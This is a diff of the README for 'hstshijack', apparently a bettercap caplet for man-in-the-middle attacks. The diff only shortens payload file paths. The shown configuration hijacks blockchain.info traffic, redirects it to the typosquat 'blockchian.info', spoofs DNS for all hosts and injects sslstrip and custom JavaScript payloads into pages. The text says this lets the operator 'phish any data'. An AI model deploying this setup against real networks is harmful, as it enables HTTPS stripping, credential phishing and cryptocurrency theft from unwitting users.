@@ -5,15 +5,15 @@
 ### Caplet
 
 ```sh
-set hstshijack.log             caplets/hstshijack/ssl.log
-set hstshijack.payload         caplets/hstshijack/payloads/hstshijack-payload.js
+set hstshijack.log             hstshijack/ssl.log
+set hstshijack.payload         hstshijack/payloads/hstshijack-payload.js
 set hstshijack.ignore          *
 set hstshijack.targets         blockchain.info,*.blockchain.info
 set hstshijack.replacements    blockchian.info,*.blockchian.info
 #set hstshijack.blockscripts    domain.com,*.domain.com
-set hstshijack.custompayloads  *:caplets/hstshijack/payloads/sslstrip.js
+set hstshijack.custompayloads  *:hstshijack/payloads/sslstrip.js
 
-set http.proxy.script  caplets/hstshijack/hstshijack.js
+set http.proxy.script  hstshijack/hstshijack.js
 #set net.sniff.output   hstshijack0001.pcap
 set net.sniff.verbose  false
 set dns.spoof.all      true
@@ -35,7 +35,7 @@ You can also inject your own JavaScript payload(s) into HTML & JS files from tar
 Example:
 
 ```sh
-hstshijack.custompayloads *:caplets/hstshijack/payloads/sslstrip.js,google.com:caplets/hstshijack/payloads/google.js,*.google.com:caplets/hstshijack/payloads/google.js
+hstshijack.custompayloads *:hstshijack/payloads/sslstrip.js,google.com:hstshijack/payloads/google.js,*.google.com:hstshijack/payloads/google.js
 ```
 
 Once the payload is injected into a page, you can technically phish any data unless the client navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.
